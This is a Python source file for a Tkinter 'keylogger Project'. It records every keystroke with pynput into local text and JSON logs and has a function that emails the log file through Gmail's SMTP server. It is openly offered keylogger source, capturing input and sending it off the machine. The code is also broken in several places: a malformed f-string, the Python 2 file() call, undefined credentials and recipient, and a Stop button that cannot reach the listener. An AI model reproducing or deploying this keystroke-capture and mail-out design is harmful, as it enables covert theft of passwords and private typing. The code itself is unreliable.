import tkinter as tk
from tkinter import *
from PIL import ImageTk, Image 
from pynput import keyboard
import json 

import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

root = tk.Tk()
root.geometry("600x350")
root.title("keylogger Project")
image_0 = Image.open("C:\\Users\\Prachi Sharma\\Downloads\\keylogger_software.jpg")
bg = ImageTk.PhotoImage(image_0)

key_list = []
x = False
key_strokes =""

def update_txt_file(key):
    with open('logs.txt','w+')as key_stroke:
        key_stroke.write(key)

def update_json_file(key_list):
    with open('log.json','+wb')as key_log:
        key_list_bytes = json.dumps(key_list).encode()
        key_log.write(key_list_bytes)

def on_press(key):
    global x,key_list
    if x == False:
        key_list.append({'Pressed': f'{key}'})   
        x = True
    if x == True:
        key_list.append({'Hold': f'{key}'}) 
    update_json_file(key_list)

def on_release(key):
    global x,key_list, key_strokes
    key_list.append({'Released':'f{key}'})
    if x == True:
        x = False
    update_json_file(key_list)

    key_strokes = key_strokes + str(key)
    update_txt_file(key_strokes)
    if x == True:
        x =False
    update_json_file(key_list)  
    key_strokes = key_strokes+str(key)   
    update_txt_file(str(key_strokes))

def butaction():

    print("[+] Running Keylogger successfully!!!\n[+] Saving the key logs in 'logs.json'")

    with keyboard.Listener(on_press=on_press,
                           on_release=on_release) as listener:
        listener.join()

def send_message():
    msg = MIMEMultipart()
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.login(USERNAME, PASSWORD)
    from_mail = "Enter from mail"
    msg['Subject'] = 'subject'
    msg['From'] = from_mail
    body = 'This is the message'

    content = MIMEText(body, 'plain')
    msg.attach(content)
    
    filename = "logs.txt"
    f = file(filename)
    attachment = MIMEText(f.read())
    attachment.add_header('Content-Disposition', 'attachment', filename=filename)           
    msg.attach(attachment)  

    s.sendmail(from_mail, to_mail, msg.as_string())

def stop_keylogger():
    global listener
    listener.stop()
    label.config(text="Keylogger stopped.")
    start_button.config(state='normal')
    stop_button.config(state='disabled')   

l=tk.Label(image=bg)
l.place(x=0, y=0, relwidth=1, relheight=1)     

label = Label(root, text='Click "Start" to begin keylogging.')
label.config(anchor=CENTER)

start_button = Button(root, text="Start", command=butaction)

label2 = Label(root, text='Enter Your E-mail')
to_mail = Entry(root)

send_button = Button(root, text="Send Mail", command=send_message)

stop_button = Button(root, text="Stop", command=stop_keylogger, state='disabled')

label.grid(row=2, column=3)
start_button.grid(row=2, column=5)
label2.grid(row=10, column=1) 
to_mail.grid(row=10, column=2,columnspan=2)
send_button.grid(row=14, column=3)
stop_button.grid(row=18, column=3) 

root.mainloop()    